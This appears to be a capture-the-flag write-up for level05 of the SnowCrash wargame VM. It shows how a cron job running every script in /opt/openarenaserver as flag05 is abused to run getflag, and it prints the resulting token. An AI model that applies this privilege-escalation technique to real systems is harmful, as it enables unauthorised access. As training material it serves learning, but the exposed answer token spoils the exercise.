# LEVEL05

## 0. Connection Hint

```bash
> ssh -p 4243 level05@127.0.0.1
	   _____                      _____               _     
	  / ____|                    / ____|             | |    
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          10.0.2.15 
level05@127.0.0.1's password: 
You have new mail.
```

When logging in directly to the VM as level05 (i.e., not via `su` command from another user), the `You have new mail.` a message is displayed.

```
You have new mail.
```

This will be useful later.

## 1. Inspect The Home Directory

```bash
level05@SnowCrash:~$ ls -la
total 12
dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout
-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc
-r-x------  1 level05 level05  675 Apr  3  2012 .profile
```
The home directory contains no immediately exploitable files.
A broader search is required to locate potentially useful files.

## 2.a Find All Files Owned by `flag05`

```bash
level05@SnowCrash:~$ find / -user "flag05" 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

**Explanation:**
>- `find`				: command used to search for files.
>- `/`					: search starting point (root directory).
>- `-user flag05`		: filters results to only files owned by \`flag05\`.
>- `2>/dev/null`		: redirects error messages to \`/dev/null\` to avoid clutter from permission errors.

## 2.b Inspect The Files

```bash
ls -l /usr/sbin/openarenaserver /rofs/usr/sbin/openarenaserver 
-rwxr-x---  1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver /rofs/usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
cat: /rofs/usr/sbin/openarenaserver: Permission denied
```

The script iterates through `/opt/openarenaserver/` and executes each file found there.
However, it does not have the SUID bit set, so it executes with the privileges of the invoking user, in this case `level05`, rather than `flag05`.

## 2.c Exploitation Test via sh

```bash
level05@SnowCrash:~$ cat << EOF > /opt/openarenaserver/id
> #!/bin/bash
> id
> EOF
level05@SnowCrash:~$ sh /usr/sbin/openarenaserver 
+ id
uid=2005(level05) gid=2005(level05) groups=2005(level05),100(users)
```

**Explanation:**
>- `cat << EOF > file`	: creates a file and writes everything until `EOF` into it.
>- `sh`					: execute a script.
>- `id`					: gives id of the current user.


The `id` output confirms that the script runs with the current user’s privileges.

## 3.a Find All `mail` Directories

```bash
level05@SnowCrash:~$ find / -type d -name mail 2>/dev/null
/var/mail
/rofs/var/mail
```

**Explanation:**
>- `find`				: command used to search for files.
>- `/`					: search starting point (root directory).
>- `-type d`			: search for directories only.
>- `-name mail`			: filters results to only files named \`mail\`.
>- `2>/dev/null`		: redirects error messages to \`/dev/null\` to avoid clutter from permission errors.

With the help of the hint found before, 2 directories can be found.

## 3.b Inspect Mail Directories

```bash
level05@SnowCrash:~$ ls -l /var/mail/ /rofs/var/mail
/rofs/var/mail:
total 1
-rw-r--r-- 1 root mail 58 Mar 12  2016 level05

/var/mail/:
total 4
-rw-r--r--+ 1 root mail 58 Aug 15 11:47 level05
level05@SnowCrash:~$ cat /var/mail/level05 /rofs/var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

A crontab entry is found, owned by `root`. This entry runs the `su -c "sh /usr/sbin/openarenaserver` every two minutes as `flag05`.
The option `- flag05` proves that the rule was created by the `root` and is executed through `cron` under the `flag05` account.

> As reminder, `cron` is a scheduler that runs tasks automatically at specified times. `crontab` files define these tasks, with each line specifying the schedule and the command to execute.


**Explanation:**
>- `*/2 * * * *`					: each * stands for a time field: `minute hour day month year`. 
>- `su`								: switches to another user. 
>- `-c`								: executes the following command.
>- `"sh /usr/sbin/openarenaserver"`	: executes the `/usr/sbin/openarenaserver` script.
>- `- flag05`						: runs this rule as `flag05` (this option is only accessible to the root).

## 3.c Exploitation Test via Cron

```bash
level05@SnowCrash:~$ cat << EOF > /opt/openarenaserver/id
#!/bin/bash
id > /tmp/id
EOF
[wait 2 minutes...]
level05@SnowCrash:~$ cat /tmp/id
uid=3005(flag05) gid=3005(flag05) groups=3005(flag05),1001(flag)
```

The `/tmp/id` output confirms that the rule was set up by `root` and is executed with `flag05` privileges.

**Explanation:**
>- `cat << EOF > file`	: creates a file and writes everything until `EOF` into it .
>- `id`					: print the uid and uig of the executing user.

## 4. Exploit Using `crontab`

```bash
level05@SnowCrash:~$ cat << EOF > /opt/openarenaserver/getflag
> #!/bin/bash
> getflag > /tmp/getflag
> EOF
[wait 2 minutes...]
level05@SnowCrash:~$ cat /tmp/
level05@SnowCrash:~$ cat /tmp/getflag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

Create a script in `/opt/openarenaserver/` that executes `getflag` and redirect the output in `/tmp/getflag`.
After waiting two minutes, the cron job runs the script as `flag05`.
Displaying the content of `/tmp/getflag` reveals the token.

**Explanation:**
>- `cat << EOF > file`	: creates a file and writes everything until `EOF` into it.

## 5. Additional Notes

When logging in directly into the VM at initial user (i.e., not through `su`), the message `You have new mail.` appear.
The solution can still be discovered by searching for files containing `/usr/sbin/openarenaserver` or by locating files named `level05`.

```bash
level05@SnowCrash:~$ find / -type f -exec grep -H "/usr/sbin/openarenaserver" {} + 2>/dev/null
Binary file /proc/27761/task/27761/cmdline matches
Binary file /proc/27761/cmdline matches
/var/mail/level05:*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
/rofs/var/mail/level05:*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

**Explanation:**
>- `find`											: command used to search for files.
>- `/`												: search starting point (root directory).
>- `-type f`										: search for files only.
>- `-exec grep -H "/usr/sbin/openarenaserver" {}`	: exec \`grep -H "/usr/sbin/openarenaserver"\` on each file found.
>- `\+` 											: terminates the exec command to run it efficiently on multiple files.
>- `2>/dev/null`									: redirects error messages to \`/dev/null\` to avoid clutter from permission errors.


```bash
level05@SnowCrash:~$ find / -type f -name level05  2>/dev/null
/var/mail/level05
/rofs/var/mail/level05
```

**Explanation:**
>- `find`				: command used to search for files.
>- `/`					: search starting point (root directory).
>- `-type d`			: search for directories only.
>- `-name level05`		: filters results to only files named \`level05\`.
>- `2>/dev/null`		: redirects error messages to \`/dev/null\` to avoid clutter from permission errors.
